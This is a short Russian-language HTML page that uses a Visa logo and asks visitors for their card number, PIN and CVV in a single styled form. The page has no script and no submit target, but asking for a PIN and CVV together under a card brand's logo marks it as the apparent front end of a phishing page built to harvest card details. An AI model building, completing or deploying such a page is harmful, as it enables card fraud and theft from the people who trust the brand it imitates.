<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ввод Пин-кода и CVV</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f5f5;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }

        .container {
            background-color: #fff;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        .logo {
            width: 100px;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            border-radius: 10px;
            border: 1px solid #ddd;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        input:focus {
            border-color: #764ba2;
        }

        button {
            background-color: #764ba2;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            width: 100%;
            margin-top: 20px;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        button:hover {
            background-color: #5e3c91;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/Visa_Logo_2014.svg" alt="Visa" class="logo">
        <h1>Введите данные карты</h1>

        <div class="form-group">
            <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="16" required>
        </div>

        <div class="form-group">
            <input type="password" id="pin" placeholder="Пин-код" maxlength="4" required>
        </div>

        <div class="form-group">
            <input type="password" id="cvv" placeholder="CVV" maxlength="3" required>
        </div>

        <button type="submit">Отправить</button>

        <div class="footer">
            <p>Все поля обязательны для заполнения</p>
        </div>
    </div>
</body>
</html>
